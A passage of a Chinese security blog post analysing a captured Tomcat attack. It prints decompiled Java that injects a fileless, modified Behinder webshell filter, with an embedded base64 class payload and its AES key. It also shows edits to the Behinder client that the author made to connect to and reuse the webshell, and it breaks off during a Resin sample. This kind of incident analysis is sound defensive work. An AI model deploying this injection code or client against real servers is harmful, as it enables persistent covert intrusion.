loadClass5 &#x3D; parent.loadClass(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class="line">                final Class&lt;?&gt; loadClass6 &#x3D; parent.loadClass(&quot;javax.servlet.Filter&quot;);</span><br><span class="line">                final Class&lt;?&gt; loadClass7 &#x3D; parent.loadClass(&quot;org.apache.catalina.core.StandardContext&quot;);</span><br><span class="line">                final Class&lt;?&gt; loadClass8 &#x3D; parent.loadClass(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);</span><br><span class="line">                final Class&lt;?&gt; loadClass9 &#x3D; parent.loadClass(&quot;org.apache.catalina.Context&quot;);</span><br><span class="line">                Class&lt;?&gt; clazz2;</span><br><span class="line">                Class&lt;?&gt; clazz3;</span><br><span class="line">                try &#123;</span><br><span class="line">                    clazz2 &#x3D; parent.loadClass(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);</span><br><span class="line">                    clazz3 &#x3D; parent.loadClass(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                catch (ClassNotFoundException ex11) &#123;</span><br><span class="line">                    clazz2 &#x3D; parent.loadClass(&quot;org.apache.catalina.deploy.FilterDef&quot;);</span><br><span class="line">                    clazz3 &#x3D; parent.loadClass(&quot;org.apache.catalina.deploy.FilterMap&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                final String s8 &#x3D; &quot;Horizontical&quot;;</span><br><span class="line">                final String s9 &#x3D; &quot;yv66vgAAADIAtAoAMQBPCgAxAFAKADEAUQcAUgcAUwgAVAsABABVCABWCgAmAFcLAAQAWAgAWQsAWgBbCABcCwBaAF0IAF4KAF8AYAcAYQcAYgoAEgBPCgASAGMIAGQKABIAZQoAEgBmCgAmAGcKABEAaAoAXwBpCwAEAGoHAGsKABwATwoAbABtCgAcAG4HAG8KAC0AcAoAcQByCgAgAFAHAHMKACQATwcAdAoAHAB1CgAmAHYKACQAdwoAXwB4CgAgAHkKAHEAegcAewoALQBXBwB8CwB9AH4HAH8HAIABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAApFeGNlcHRpb25zBwCBAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQANU3RhY2tNYXBUYWJsZQcAUgcAUwcAbwcAggcAgwcAhAcAhQcAhgcAawcAfAcAhwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQARSG9yaXpvbnRpY2FsLmphdmEMADMANAwAMwA3DACIAIkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAApVc2VyLUFnZW50DACKAIsBAHFNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODQuMC40OTYuMTkgU2FmYXJpLzUzNy4zNgwAjACNDACOAI8BAAF1BwCQDACRAJIBABA4YzI1ZGZiZWRmOWU0MDJhDACTAJQBAANBRVMHAIUMAJUAlgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAlwCYAQAADACXAJkMAJoAmwwAnACdDAAzAJ4MADoAnwwAoAChAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAIYMAKIAowwApAClAQAMSG9yaXpvbnRpY2FsDACmAKcHAKgMAKkAqgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIBABBqYXZhL2xhbmcvU3RyaW5nDACrAJ0MADMArAwArQCuDACvALAMADgAOQwAsQCyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9UaHJvd2FibGUHAIQMAD4AswEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmF4L2NyeXB0by9DaXBoZXIBACBqYXZheC9zZXJ2bGV0L1NlcnZsZXRJbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABmFwcGVuZAEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAOZ2V0SW5wdXRTdHJlYW0BACQoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRJbnB1dFN0cmVhbTsBAARyZWFkAQADKClJAQAFd3JpdGUBAAQoSSlWAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQALdG9CeXRlQXJyYXkBAAUoW0IpVgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAgADEAAQAyAAAABgABADMANAABADUAAAAhAAEAAQAAAAUqtwABsQAAAAEANgAAAAoAAgAAABQABAAVAAEAMwA3AAEANQAAACIAAgACAAAABiortwACsQAAAAEANgAAAAoAAgAAABgABQAZAAEAOAA5AAEANQAAACEABAACAAAACSorAyu+twADsAAAAAEANgAAAAYAAQAAABwAAQA6ADsAAgA1AAAAGQAAAAIAAAABsQAAAAEANgAAAAYAAQAAACAAPAAAAAQAAQA9AAEAPgA&#x2F;AAIANQAAAeMABwAKAAABCivAAAQ6BCzAAAU6BRkEEga5AAcCAMYA7BkEEga5AAcCABIItgAJmQDbGQS5AAoBABILuQAMAgDHABMZBLkACgEAEgsSDbkADgMAEg+4ABA6BxkHBbsAEVm7ABJZtwATGQS5AAoBABILuQAMAgC2ABQSFbYAFrYAF7YAGBIPtwAZtgAaGQS5ABsBADoIuwAcWbcAHToJGQi2AB5ZNgYCnwANGQkVBrYAH6f&#x2F;7bsAIFkqtgAhtgAitwAjGQe7ACRZtwAluwAmWRkJtgAntwAotgAptgAqtgArtgAsBb0ALVkDGQS5AAoBAFNZBBkFU7YALlenABg6Bi0rLLkAMAMApwALLSssuQAwAwCxAAEAKQDxAPQALwACADYAAABKABIAAAAjAAYAJAAMACUAKQAoADoAKQBKACsAUQAsAIMALQCMAC4AlQAvAKEAMACrADIA8QA1APQAMwD2ADQA&#x2F;gA1AQEANwEJADkAQAAAAG8ABv0ASgcAQQcAQv8ASgAKBwBDBwBEBwBFBwBGBwBBBwBCAAcARwcASAcASQAA&#x2F;wAVAAoHAEMHAEQHAEUHAEYHAEEHAEIBBwBHBwBIBwBJAAD&#x2F;AEgABgcAQwcARAcARQcARgcAQQcAQgABBwBKDAcAPAAAAAYAAgBLAD0AAQBMADQAAQA1AAAAGQAAAAEAAAABsQAAAAEANgAAAAYAAQAAADwAAQBNAAAAAgBO&quot;;</span><br><span class="line">                byte[] array5;</span><br><span class="line">                try &#123;</span><br><span class="line">                    final Class&lt;?&gt; loadClass10 &#x3D; parent.loadClass(&quot;java.util.Base64&quot;);</span><br><span class="line">                    array5 &#x3D; (byte[])parent.loadClass(&quot;java.util.Base64$Decoder&quot;).getMethod(&quot;decode&quot;, String.class).invoke(loadClass10.getMethod(&quot;getDecoder&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(loadClass10, new Object[0]), s9);</span><br><span class="line">                &#125;</span><br><span class="line">                catch (ClassNotFoundException ex12) &#123;</span><br><span class="line">                    final Class&lt;?&gt; loadClass11 &#x3D; parent.loadClass(&quot;javax.xml.bind.DatatypeConverter&quot;);</span><br><span class="line">                    array5 &#x3D; (byte[])loadClass11.getMethod(&quot;parseBase64Binary&quot;, String.class).invoke(loadClass11, s9);</span><br><span class="line">                &#125;</span><br><span class="line">                final Method declaredMethod &#x3D; parent.loadClass(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">                declaredMethod.setAccessible(true);</span><br><span class="line">                final Class clazz4 &#x3D; (Class)declaredMethod.invoke(parent, s8, array5, 0, array5.length);</span><br><span class="line">                final Object instance &#x3D; clazz2.newInstance();</span><br><span class="line">                final Object instance2 &#x3D; clazz3.newInstance();</span><br><span class="line">                boolean b3 &#x3D; false;</span><br><span class="line">                try &#123;</span><br><span class="line">                    loadClass5.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                catch (NoSuchFieldException ex13) &#123;</span><br><span class="line">                    b3 &#x3D; true;</span><br><span class="line">                &#125;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (!b3) &#123;</span><br><span class="line">                        clazz2.getMethod(&quot;setFilter&quot;, loadClass6).invoke(instance, clazz4.newInstance());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (NoSuchMethodException ex6) &#123;</span><br><span class="line">                    throw ex6;</span><br><span class="line">                &#125;</span><br><span class="line">                clazz2.getMethod(&quot;setFilterClass&quot;, String.class).invoke(instance, s8);</span><br><span class="line">                clazz2.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance, s8);</span><br><span class="line">                loadClass7.getMethod(&quot;addFilterDef&quot;, clazz2).invoke(invoke3, instance);</span><br><span class="line">                clazz3.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance2, s8);</span><br><span class="line">                clazz3.getMethod(&quot;addURLPattern&quot;, String.class).invoke(instance2, &quot;*&quot;);</span><br><span class="line">                if (b3) &#123;</span><br><span class="line">                    final Field declaredField7 &#x3D; loadClass7.getDeclaredField(&quot;filterMaps&quot;);</span><br><span class="line">                    declaredField7.setAccessible(true);</span><br><span class="line">                    final Object value5 &#x3D; declaredField7.get(invoke3);</span><br><span class="line">                    final int length2 &#x3D; Array.getLength(value5);</span><br><span class="line">                    final Object instance3 &#x3D; Array.newInstance(clazz3, length2 + 1);</span><br><span class="line">                    Array.set(instance3, 0, instance2);</span><br><span class="line">                    int k &#x3D; 0;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        while (k &lt; length2) &#123;</span><br><span class="line">                            Array.set(instance3, k + 1, Array.get(value5, k));</span><br><span class="line">                            ++k;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch (NoSuchMethodException ex7) &#123;</span><br><span class="line">                        throw ex7;</span><br><span class="line">                    &#125;</span><br><span class="line">                    declaredField7.set(invoke3, instance3);</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    final Field declaredField8 &#x3D; loadClass7.getDeclaredField(&quot;filterMaps&quot;);</span><br><span class="line">                    declaredField8.setAccessible(true);</span><br><span class="line">                    final Object value6 &#x3D; declaredField8.get(invoke3);</span><br><span class="line">                    final Field declaredField9 &#x3D; value6.getClass().getDeclaredField(&quot;insertPoint&quot;);</span><br><span class="line">                    declaredField9.setAccessible(true);</span><br><span class="line">                    final int int1 &#x3D; Integer.parseInt(declaredField9.get(value6).toString());</span><br><span class="line">                    declaredField9.set(value6, 0);</span><br><span class="line">                    loadClass7.getMethod(&quot;addFilterMapBefore&quot;, clazz3).invoke(invoke3, instance2);</span><br><span class="line">                    declaredField9.set(value6, int1 + 1);</span><br><span class="line">                &#125;</span><br><span class="line">                final Constructor&lt;?&gt; declaredConstructor &#x3D; loadClass8.getDeclaredConstructor(loadClass9, clazz2);</span><br><span class="line">                declaredConstructor.setAccessible(true);</span><br><span class="line">                final Object instance4 &#x3D; declaredConstructor.newInstance(invoke3, instance);</span><br><span class="line">                Field declaredField10 &#x3D; null;</span><br><span class="line">                Class&lt;?&gt; superclass &#x3D; loadClass7;</span><br><span class="line">                while (superclass !&#x3D; null) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        declaredField10 &#x3D; superclass.getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch (NoSuchFieldException ex14) &#123;</span><br><span class="line">                        superclass &#x3D; superclass.getSuperclass();</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if (declaredField10 !&#x3D; null) &#123;</span><br><span class="line">                    declaredField10.setAccessible(true);</span><br><span class="line">                    ((HashMap)declaredField10.get(invoke3)).put(s8, instance4);</span><br><span class="line">                &#125;</span><br><span class="line">                try &#123;</span><br><span class="line">                    final File file &#x3D; new File(System.getProperty(&quot;java.io.tmpdir&quot;));</span><br><span class="line">                    final File file2 &#x3D; new File(file, s8.replace(&quot;.&quot;, &quot;&#x2F;&quot;) + &quot;.class&quot;);</span><br><span class="line">                    Label_2082: &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            if (!file2.exists()) &#123;</span><br><span class="line">                                if (!file2.createNewFile()) &#123;</span><br><span class="line">                                    break Label_2082;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        catch (NoSuchMethodException ex8) &#123;</span><br><span class="line">                            throw ex8;</span><br><span class="line">                        &#125;</span><br><span class="line">                        final Constructor&lt;?&gt; declaredConstructor2 &#x3D; parent.loadClass(&quot;sun.misc.URLClassPath$FileLoader&quot;).getDeclaredConstructor(URL.class);</span><br><span class="line">                        declaredConstructor2.setAccessible(true);</span><br><span class="line">                        final Object instance5 &#x3D; declaredConstructor2.newInstance(file.toURI().toURL());</span><br><span class="line">                        ClassLoader classLoader;</span><br><span class="line">                        for (classLoader &#x3D; ClassLoader.getSystemClassLoader(); classLoader.getParent() !&#x3D; null; classLoader &#x3D; classLoader.getParent()) &#123;&#125;</span><br><span class="line">                        Field declaredField11 &#x3D; null;</span><br><span class="line">                        Serializable s10 &#x3D; classLoader.getClass();</span><br><span class="line">                        while (s10 !&#x3D; null) &#123;</span><br><span class="line">                            try &#123;</span><br><span class="line">                                declaredField11 &#x3D; ((Class)s10).getDeclaredField(&quot;ucp&quot;);</span><br><span class="line">                            &#125;</span><br><span class="line">                            catch (NoSuchFieldException ex15) &#123;</span><br><span class="line">                                s10 &#x3D; ((Class&lt;? extends ClassLoader&gt;)s10).getSuperclass();</span><br><span class="line">                                continue;</span><br><span class="line">                            &#125;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        if (declaredField11 !&#x3D; null) &#123;</span><br><span class="line">                            declaredField11.setAccessible(true);</span><br><span class="line">                            final Field declaredField12 &#x3D; Field.class.getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">                            declaredField12.setAccessible(true);</span><br><span class="line">                            declaredField12.setInt(declaredField11, 0);</span><br><span class="line">                            final Object value7 &#x3D; declaredField11.get(classLoader);</span><br><span class="line">                            Field declaredField13 &#x3D; null;</span><br><span class="line">                            Class&lt;?&gt; clazz5 &#x3D; value7.getClass();</span><br><span class="line">                            while (clazz5 !&#x3D; null) &#123;</span><br><span class="line">                                try &#123;</span><br><span class="line">                                    declaredField13 &#x3D; clazz5.getDeclaredField(&quot;loaders&quot;);</span><br><span class="line">                                &#125;</span><br><span class="line">                                catch (NoSuchFieldException ex16) &#123;</span><br><span class="line">                                    clazz5 &#x3D; clazz5.getSuperclass();</span><br><span class="line">                                    continue;</span><br><span class="line">                                &#125;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                            if (declaredField13 !&#x3D; null) &#123;</span><br><span class="line">                                declaredField13.setAccessible(true);</span><br><span class="line">                                ((ArrayList)declaredField13.get(value7)).add(instance5);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                catch (Exception ex17) &#123;&#125;</span><br><span class="line">                b &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (b) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (NoSuchMethodException ex9) &#123;</span><br><span class="line">            throw ex9;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception ex18) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>关键过程：</p>
<ol>
<li><p>从<code>Thread.currentThread()</code>开始，通过反射获取Request对象。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/5.png" alt=""></p>
</li>
<li><p>进一步获取到StandardContext。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">final Field declaredField6 &#x3D; loadClass3.getDeclaredField(&quot;req&quot;);</span><br><span class="line">declaredField6.setAccessible(true);</span><br><span class="line">final Object value4 &#x3D; declaredField6.get(value3);</span><br><span class="line">final Object invoke2 &#x3D; value4.getClass().getMethod(&quot;getNote&quot;, Integer.TYPE).invoke(value4, 1);</span><br><span class="line">final Object invoke3 &#x3D; invoke2.getClass().getMethod(&quot;getContext&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke2, new Object[0]);</span><br></pre></td></tr></table></figure></li>
<li><p>自定义一个名为Horizontical的无文件冰蝎Webshell Filter，AES加密通信的密钥为8c25dfbedf9e402a，可以看到这个冰蝎Webshell是被改过了的。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/6.png" alt=""></p>
</li>
<li><p>构造FilterDef，并添加到FilterMap，然后将添加的FilterMap调整到首位，最后把filterConfig放到filterConfigs中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">clazz2.getMethod(&quot;setFilterClass&quot;, String.class).invoke(instance, s8);</span><br><span class="line">clazz2.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance, s8);</span><br><span class="line">loadClass7.getMethod(&quot;addFilterDef&quot;, clazz2).invoke(invoke3, instance);</span><br><span class="line">clazz3.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance2, s8);</span><br><span class="line">clazz3.getMethod(&quot;addURLPattern&quot;, String.class).invoke(instance2, &quot;*&quot;);</span><br><span class="line">...</span><br><span class="line">while (superclass !&#x3D; null) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        declaredField10 &#x3D; superclass.getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (NoSuchFieldException ex14) &#123;</span><br><span class="line">        superclass &#x3D; superclass.getSuperclass();</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">if (declaredField10 !&#x3D; null) &#123;</span><br><span class="line">    declaredField10.setAccessible(true);</span><br><span class="line">    ((HashMap)declaredField10.get(invoke3)).put(s8, instance4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>至此，这个攻击的EXP就差不多分析完了。可以说很佩服这个对手了，从一开始的BasicDataSource结合时间延迟检测漏洞，到加密增加分析的难度，然后综合考虑Tomcat不同版本的兼容性，各种try catch以及if else，关键这Filter的名字还起的这么文艺。</p>
<p>其实如果只是想获知无文件Webshell的部分，也没必要搞得这么复杂，最快捷的方法，就是在本地环境重放一次攻击流量，然后用Arthas去Attach就可以了。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/7.png" alt=""></p>
<h2 id="0x5-流量解密"><a href="#0x5-流量解密" class="headerlink" title="0x5 流量解密"></a>0x5 流量解密</h2><p>拿到冰蝎AES加密通信的密钥之后，基本就可以对冰蝎加密的流量进行解密了，解密了流量之后,对手用这个Webshell做了什么事情基本就一清二楚了。</p>
<p>用反编译的冰蝎代码直接调解密函数去解密即可。<br>net/rebeyond/behinder/core/Crypt.java#DecryptForJava<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/8.png" alt=""></p>
<p>这里不得不再佩服一下这个对手，解了冰蝎的第一个通信流量发现这个改造的冰蝎居然还有一次随机密钥重置的过程，也就是说后续通信加密的密钥变了，庆幸当时我们流量是全的，很轻易的就拿到了这个随机密钥，所以并没有太多影响，最后还是成功的解了出来。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/9.png" alt=""></p>
<h2 id="0x6-冰蝎改造"><a href="#0x6-冰蝎改造" class="headerlink" title="0x6 冰蝎改造"></a>0x6 冰蝎改造</h2><p>当时感觉这个EXP还挺好用的，干脆直接拿来用了。因为注入的无文件冰蝎Webshell是修改过的，因此基于这个Webshell直接修改了一版可以适配的冰蝎客户端。当然，其实也可以直接把Webshell部分直接改掉，我这里是选择了一种相对曲折一点的方法。</p>
<p>我是基于冰蝎v3.0 Beta5版本进行修改的，主要修改了两个地方：</p>
<ol>
<li><p>冰蝎v3.0 Beta5版本的AES加密密钥是取了原密码的MD5的前16位，但是由于我不知道密钥8c25dfbedf9e402a对应的原密码，因此我直接把AES密钥修改为直接输入的密码了，这样子我输入连接密码时，直接填入8c25dfbedf9e402a就行了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static String getKey(final String password) throws Exception &#123;</span><br><span class="line">    &#x2F;&#x2F;return getMD5(password);</span><br><span class="line">    return password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>去掉需要依赖JSP的PageContext。这部分主要是对net.rebeyond.behinder.payload.java包里面各个类的equal方法进行修改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; final PageContext page &#x3D; (PageContext)obj;</span><br><span class="line">&#x2F;&#x2F; this.Session &#x3D; page.getSession();</span><br><span class="line">&#x2F;&#x2F; this.Response &#x3D; page.getResponse();</span><br><span class="line">&#x2F;&#x2F; this.Request &#x3D; page.getRequest();</span><br><span class="line">final Object[] page &#x3D; (Object[])obj;</span><br><span class="line">final ServletResponse response &#x3D; (ServletResponse)page[1];</span><br><span class="line">final HttpSession session &#x3D; (HttpSession)page[0];</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>改完之后重新编译一版冰蝎客户端，本地环境重放攻击后使用冰蝎连接成功。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/10.png" alt=""></p>
<h2 id="0x7-新样本分析"><a href="#0x7-新样本分析" class="headerlink" title="0x7 新样本分析"></a>0x7 新样本分析</h2><p>最后看一下宽字节安全发出来的新样本，这么长时间过去了看看有什么新的变化。同样的，反编译的代码也是有问题的，出现问题的代码和之前基本是一样的，对于这个问题的解决已经轻车熟路了。</p>
<p>这类名看起来还是那么的文艺，Overbrilliantly，但我也不知道是什么意思。从解密的结果大致可以看出来这是一个基于Resin的动态注册Filter的无文件Webshell攻击，之前还真没怎么看过Resin的无文件Webshell实现。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/11.png" alt=""></p>
<p>解密出来实现注册无文件Webshell的代码大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    final ClassLoader contextClassLoader &#x3D; 